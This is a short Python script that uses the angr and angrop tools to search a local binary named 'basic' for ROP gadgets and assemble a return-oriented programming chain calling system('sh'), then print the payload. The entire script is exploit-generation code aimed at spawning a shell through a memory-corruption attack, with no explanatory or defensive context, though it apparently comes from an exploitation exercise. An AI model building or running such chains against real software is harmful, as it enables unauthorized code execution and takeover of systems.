#!/usr/bin/python3

import angr, angrop

p = angr.Project("basic")
rop = p.analyses.ROP()
rop.find_gadgets()
chain = rop.func_call("system", ["sh"])
chain.print_payload_str()
